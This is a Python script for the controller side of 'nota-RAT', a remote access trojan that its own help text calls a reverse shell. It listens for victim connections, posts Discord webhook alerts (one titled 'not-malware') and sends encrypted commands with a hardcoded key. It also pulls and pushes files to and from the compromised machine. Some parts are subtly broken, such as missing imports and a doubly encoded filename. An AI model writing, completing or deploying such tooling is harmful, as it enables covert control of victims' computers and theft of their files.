import socket
import argparse
import os 
import sys
from pythonping import ping
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=421, help="Port of the Server", type=int
)

parser.add_argument(
    "-d", "--discord", help="Discord webhook for new connections", type=str
)


args = parser.parse_args()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


print("""
              _          _____         _______ 
             | |        |  __ \     /\|__   __|
  _ __   ___ | |_ __ _  | |__) |   /  \  | |   
 | '_ \ / _ \| __/ _` | |  _  /   / /\ \ | |   
 | | | | (_) | || (_| | | | \ \  / ____ \| |   
 |_| |_|\___/ \__\__,_| |_|  \_\/_/    \_\_|                                                
       nota RAT v 1.0 | fluffydolphin                             
""")


s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")


if args.discord:
    ping_command = f"ping {client_address[0]}"

    if platform == 'win32':
        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
        ping = re.search("Average = (.*)", pings_command)
    else: 
        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
        ping = re.split("/", pings_command)
    ping = ping[-1].replace("\n", "")


    webhook = DiscordWebhook(url=args.discord, content='@everyone')
    embed = DiscordEmbed(title='not-malware', description='An encrypted reverse shell', color='03b2f8')
    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
    embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
    embed.add_embed_field(name='Ping', value=f'{ping}')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()


cwd = client_socket.recv(BUFFER_SIZE)
cwd = Fernet(key).decrypt(cwd).decode()
print("[+] Current working directory:", cwd)

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    commandz = Fernet(key).encrypt(command.encode())
    client_socket.send(commandz)
    if command.lower() == "exit":
        if args.discord:
            webhook = DiscordWebhook(url=args.discord, content='@everyone')
            embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
            embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
            embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
        client_socket.close()
        s.close()
        break
    if command == "/getfile":
        filename = input("Please enter the filename: ")
        filename = Fernet(key).encrypt(filename.encode())
        client_socket.send(filename.encode())
        remaining = int.from_bytes(client_socket.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    if command == "/sendfile":
        filename = input("Please enter the filename: ")
        client_socket.send(bytes(filename, "utf-8"))
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                client_socket.send(dataLen.to_bytes(4,'big'))
                client_socket.send(data)
            f.close()
    output = client_socket.recv(BUFFER_SIZE)
    output = Fernet(key).decrypt(output).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)
client_socket.close()
s.close()
